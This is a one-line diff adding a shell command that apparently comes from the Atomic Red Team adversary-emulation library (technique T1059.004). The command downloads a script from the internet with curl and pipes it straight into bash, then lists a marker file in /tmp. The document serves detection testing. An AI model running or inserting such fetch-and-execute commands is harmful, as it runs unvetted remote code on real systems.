@@ -1,0 +1,1 @@
+cd /tmp; curl -s https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1059.004/src/pipe-to-shell.sh |bash; ls -la /tmp/art.txt
